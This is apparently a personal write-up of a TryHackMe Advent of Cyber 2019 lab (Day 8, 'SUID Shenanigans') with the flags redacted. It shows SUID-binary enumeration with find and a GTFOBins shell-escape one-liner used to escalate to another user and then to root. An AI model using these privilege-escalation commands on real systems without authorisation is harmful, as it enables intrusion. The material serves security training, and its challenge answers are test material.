---
title: "TryHackMe Advent of Cyber 2019 Day 8"
date: 2019-12-08
layout: post
platform: "TryHackMe"
writeup_type: "seasonal"
series: "Advent of Cyber 2019"
event_day: "Day 8"
permalink: "/writeups/advent-of-cyber/adventofcyber-2019-day-8/"
tags:
  - tryhackme
  - seasonal
  - advent-of-cyber-2019
  - day-8
---

# SUID Shenanigans

```text
nmap
65534 - ssh
```

```text
find suid perm for user igor
find / -user igor -type f -perm /4000 2> /dev/null   /usr/bin/find
						     /usr/bin/nmap

exploit find command by {gtfobins}
find . -exec /bin/sh \; -quit
cat /home/igor/flag1.txt
{answer 2}
```

```text
find / -user root -type f -perm /4000 2> /dev/null
/usr/bin/system-control   --> allow to run command
{answer 3}
```

## Task
- What port is SSH running on?
```text
65534
```

- Find and run a file as igor. Read the file /home/igor/flag1.txt
```text
[redacted challenge flag]
```

- Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?
```text
[redacted challenge flag]
```
